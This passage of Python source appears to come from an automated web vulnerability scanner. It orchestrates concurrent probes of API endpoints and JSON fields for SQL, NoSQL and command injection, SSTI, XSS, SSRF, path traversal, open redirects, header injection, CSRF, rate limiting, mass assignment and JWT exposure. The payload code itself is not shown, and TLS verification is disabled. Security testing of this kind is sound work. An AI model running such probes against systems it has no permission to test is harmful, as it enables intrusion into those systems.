                        select(ScanResultORM.url, ScanResultORM.raw_output)
                        .where(
                            ScanResultORM.scan_id == _UUID(scan_id),
                            or_(
                                ScanResultORM.vulnerability_type == "api_endpoint",
                                ScanResultORM.vulnerability_type == "graphql_field",
                            ),
                        )
                    )
                    rows = await _s.execute(stmt)
                    for row_url, row_raw in rows:
                        if not row_url or not isinstance(row_raw, dict):
                            continue
                        params_all = row_raw.get("params", {}).get("all", [])
                        if isinstance(params_all, list) and params_all:
                            existing = openapi_param_map.get(row_url, [])
                            openapi_param_map[row_url] = list(set(existing + params_all))
                if openapi_param_map:
                    logger.info(
                        f"[inspector] Loaded OpenAPI/GraphQL params for "
                        f"{len(openapi_param_map)} endpoint(s) from spec"
                    )
                    # Merge openapi params into arjun_raw so _extract_targets sees them
                    for ep_url, param_names in openapi_param_map.items():
                        arjun_raw.append({
                            "url":        ep_url,
                            "parameters": param_names,
                            "method":     "GET",
                            "source":     "openapi_spec",
                        })
            except Exception as exc:
                logger.debug(f"[inspector] OpenAPI param query failed: {exc}")

        targets = _extract_targets(endpoints, arjun_raw, target, json_endpoint_map)
        if not targets:
            logger.warning("[inspector] No testable endpoints found (no parameters)")
            return []

        # M8: Merge strategy priority_types into every endpoint's vuln_types so they
        # are always tested, even if parameter-name heuristics didn't flag them.
        if forced_vuln_types:
            for ep in targets:
                for vt in forced_vuln_types:
                    if vt not in ep.vuln_types:
                        ep.vuln_types.append(vt)

        logger.info(
            f"[inspector] {len(targets)} endpoint(s) to test "
            f"(top score: {targets[0].score if targets else 0})"
        )

        headers = _build_headers(auth_context)
        semaphore = asyncio.Semaphore(MAX_CONCURRENCY)

        findings: List[Dict[str, Any]] = []
        findings_lock = asyncio.Lock()

        async def test_endpoint(ep: EndpointTarget):
            async with semaphore:
                partial = await self._test_one(ep, headers)
                if partial:
                    async with findings_lock:
                        findings.extend(partial)
                        logger.info(
                            f"[inspector] {ep.url} → "
                            f"{len(partial)} candidate(s) found"
                        )

        # Run injection tests + JWT detection concurrently
        jwt_task = asyncio.create_task(
            _detect_jwt_tokens(target, auth_context, endpoints)
        )
        await asyncio.gather(*[test_endpoint(ep) for ep in targets])
        jwt_findings = await jwt_task
        findings.extend(jwt_findings)

        # Sort by severity: critical > high > medium > low > info
        _sev_order = {
            SeverityLevel.critical: 0,
            SeverityLevel.high:     1,
            SeverityLevel.medium:   2,
            SeverityLevel.low:      3,
            SeverityLevel.info:     4,
        }
        findings.sort(key=lambda f: _sev_order.get(f["severity"], 5))

        logger.info(
            f"[inspector] Completed. {len(findings)} candidate(s) across "
            f"{len(targets)} endpoint(s) "
            f"({len(jwt_findings)} JWT token(s) found)"
        )
        return findings

    async def _test_one(
        self,
        ep: EndpointTarget,
        headers: Dict[str, str],
    ) -> List[Dict[str, Any]]:
        """Test one endpoint across all applicable detection strategies."""
        findings: List[Dict[str, Any]] = []

        async with httpx.AsyncClient(
            headers=headers,
            verify=False,
            follow_redirects=True,
            timeout=httpx.Timeout(REQUEST_TIMEOUT),
        ) as client:

            # Establish baseline
            baseline_url = ep.url
            if ep.params:
                qs = urlencode({k: v[0] for k, v in ep.params.items()})
                baseline_url = f"{ep.url}?{qs}"

            bl = await _request(client, ep.method, baseline_url)
            if bl is None:
                logger.debug(f"[inspector] Baseline failed for {ep.url}")
                return []

            bl_status, bl_body, bl_time = bl
            baseline = Baseline(
                status=bl_status,
                body=bl_body,
                size=len(bl_body),
                time_ms=bl_time * 1000,
            )

            for param_name in ep.params:
                # ── Universal probe: let the application tell us what to test ──
                signals = await universal_probe(
                    client, ep.url, ep.method, ep.params, param_name, baseline
                )

                # Track whether this param already has a finding (for priority skip)
                _param_found = False

                # ── SQLi: DB error OR timing anomaly from probe ────────────────
                if signals.db_error_found or signals.timing_anomaly:
                    result = await _detect_sqli(
                        client, ep.url, ep.method, ep.params, param_name, baseline
                    )
                    if result:
                        findings.append(_build_finding(ep, param_name, "sqli_candidate", result))
                        _param_found = True

                # ── SSTI: template expression evaluated ───────────────────────
                if not _param_found and signals.template_eval:
                    result = await _detect_ssti(
                        client, ep.url, ep.method, ep.params, param_name
                    )
                    if result:
                        findings.append(_build_finding(ep, param_name, "ssti_candidate", result))
                        _param_found = True

                # ── XSS: canary reflected in HTML/script/attr context ─────────
                if not _param_found and (
                    signals.reflects_canary
                    and signals.reflection_ctx in ("html", "script", "attr")
                ):
                    result = await _detect_xss(
                        client, ep.url, ep.method, ep.params, param_name, baseline
                    )
                    if result:
                        findings.append(_build_finding(ep, param_name, "xss_candidate", result))
                        _param_found = True

                # ── SSRF: value is a URL or context suggests URL handling ─────
                if not _param_found and signals.value_is_url:
                    result = await _detect_ssrf(
                        client, ep.url, ep.method, ep.params, param_name, baseline
                    )
                    if result:
                        findings.append(_build_finding(ep, param_name, "ssrf_candidate", result))
                        _param_found = True

                # ── CMDi: status changed on syntax probe ──────────────────────
                if not _param_found and signals.status_changed:
                    result = await _detect_cmdi(
                        client, ep.url, ep.method, ep.params, param_name, baseline
                    )
                    if result:
                        findings.append(_build_finding(ep, param_name, "cmdi_candidate", result))
                        _param_found = True

                # ── NoSQL: any signal on API endpoints ───────────────────────
                if not _param_found and (
                    signals.status_changed or signals.reflects_canary or signals.db_error_found
                ):
                    result = await _detect_nosql(
                        client, ep.url, ep.method, ep.params, param_name, baseline
                    )
                    if result:
                        findings.append(_build_finding(ep, param_name, "nosql_candidate", result))
                        _param_found = True

                # ── Path traversal: cheap + clear signal, always run ──────────
                if not _param_found:
                    result = await _detect_path_traversal(
                        client, ep.url, ep.method, ep.params, param_name
                    )
                    if result:
                        findings.append(_build_finding(ep, param_name, "path_traversal", result))
                        _param_found = True

                # ── Open redirect: always run, distinctive canary ─────────────
                if not _param_found:
                    result = await _detect_open_redirect(
                        client, ep.url, ep.method, ep.params, param_name
                    )
                    if result:
                        findings.append(_build_finding(ep, param_name, "open_redirect", result))

            # ── Endpoint-level checks (run once per URL, not per param) ───────
            # Header injection: Host override, X-Original-URL bypass, IP bypass
            hi = await _detect_header_injection(client, ep.url, baseline)
            if hi:
                findings.append(_build_finding(ep, "__headers__", "header_injection", hi))

            # CSRF: cross-origin acceptance, missing SameSite
            csrf = await _detect_csrf(client, ep.url, ep.method, baseline, headers)
            if csrf:
                findings.append(_build_finding(ep, "__csrf__", "csrf", csrf))

            # Open redirect: aggressive endpoint-level probe for dedicated redirect params
            redir_agg = await _detect_open_redirect_aggressive(client, ep.url)
            if redir_agg:
                findings.append({
                    "url":    ep.url,
                    "type":   "open_redirect",
                    "param":  redir_agg.get("param", "__redirect__"),
                    "severity": SeverityLevel.medium,
                    "vulnerability_type": "open_redirect",
                    "description": redir_agg["evidence"],
                    "evidence":    redir_agg.get("evidence", ""),
                    "raw_output":  {**redir_agg, "owasp": "A01:2021 – Broken Access Control"},
                })

            # Rate limiting + race condition
            rl = await _detect_rate_limit(client, ep.url, ep.method, baseline)
            if rl:
                findings.append({
                    "url":    ep.url,
                    "type":   "missing_rate_limit",
                    "param":  "__rate_limit__",
                    "severity": SeverityLevel.medium,
                    "vulnerability_type": "missing_rate_limit",
                    "description": rl["description"],
                    "evidence":    rl.get("evidence", ""),
                    "raw_output":  rl,
                })

            # ── JSON body injection pass (REST API endpoints) ──────────────────
            if ep.json_body:
                json_baseline = await _request(
                    client, "POST", ep.url,
                    data=ep.json_body, json_body=True,
                )
                if json_baseline is not None:
                    jbl_status, jbl_body, jbl_time = json_baseline
                    jbaseline = Baseline(
                        status=jbl_status,
                        body=jbl_body,
                        size=len(jbl_body),
                        time_ms=jbl_time * 1000,
                    )

                    # Mass assignment probe runs once per endpoint (whole-body)
                    ma_det = await _detect_mass_assignment_json(
                        client, ep.url, ep.json_body, jbaseline
                    )
                    if ma_det:
                        findings.append(
                            _build_json_finding(ep, "__body__", "mass_assignment", ma_det)
                        )

                    for field_name, field_val in ep.json_body.items():
                        if not isinstance(field_val, str):
                            continue  # only inject into string fields

                        # ── Universal probe on each JSON field ────────────────
                        jsig = await universal_probe_json(
                            client, ep.url, ep.json_body, field_name, jbaseline
                        )
                        _jfound = False

                        # SQLi: DB error or timing anomaly
                        if jsig.db_error_found or jsig.timing_anomaly:
                            det = await _detect_sqli_json(
                                client, ep.url, ep.json_body, field_name, jbaseline
                            )
                            if det:
                                findings.append(
                                    _build_json_finding(ep, field_name, "sqli_candidate", det)
                                )
                                _jfound = True

                        # SSTI: template expression evaluated
                        if not _jfound and jsig.template_eval:
                            det = await _detect_ssti_json(
                                client, ep.url, ep.json_body, field_name
                            )
                            if det:
                                findings.append(
                                    _build_json_finding(ep, field_name, "ssti_candidate", det)
                                )
                                _jfound = True

                        # XSS: canary in HTML/script context
                        if not _jfound and (
                            jsig.reflects_canary
                            and jsig.reflection_ctx in ("html", "script", "attr")
                        ):
                            det = await _detect_xss_json(
                                client, ep.url, ep.json_body, field_name, jbaseline
                            )
                            if det:
                                findings.append(
                                    _build_json_finding(ep, field_name, "xss_candidate", det)
                                )
                                _jfound = True

                        # SSRF: field value is a URL
                        if not _jfound and jsig.value_is_url:
                            det = await _detect_ssrf_json(
                                client, ep.url, ep.json_body, field_name, jbaseline
                            )
                            if det:
                                findings.append(
                                    _build_json_finding(ep, field_name, "ssrf_candidate", det)
                                )
                                _jfound = True

                        # NoSQL: any signal present
                        if not _jfound and (
                            jsig.status_changed or jsig.reflects_canary or jsig.db_error_found
                        ):
                            det = await _detect_nosql_json(
                                client, ep.url, ep.json_body, field_name, jbaseline
                            )
                            if det:
                                findings.append(
                                    _build_json_finding(ep, field_name, "nosql_candidate", det)
                                )

        return findings


# ── Entry point ────────────────────────────────────────────────────────────────

async def main():
    worker = InspectorWorker()
    try:
        await worker.start()
        while worker.running:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        await worker.shutdown()


if __name__ == "__main__":
    asyncio.run(main())
